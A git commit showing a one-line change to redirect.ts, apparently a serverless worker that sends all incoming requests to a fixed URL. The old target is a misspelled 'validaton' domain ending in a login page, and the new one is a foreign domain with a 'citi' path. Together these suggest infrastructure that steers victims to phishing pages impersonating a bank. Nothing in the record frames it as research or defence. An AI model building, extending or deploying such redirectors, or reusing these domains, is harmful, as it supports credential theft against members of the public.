5ec4e90a24f5770aa993c5b85fcdf77ab77f20d7
kofigrande <104198466+kofigrande@users.noreply.github.com>
2025-04-09 17:19:19 -0600

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://step1validaton.com/rec/login.php"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://srcu-inc404.de/citi"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
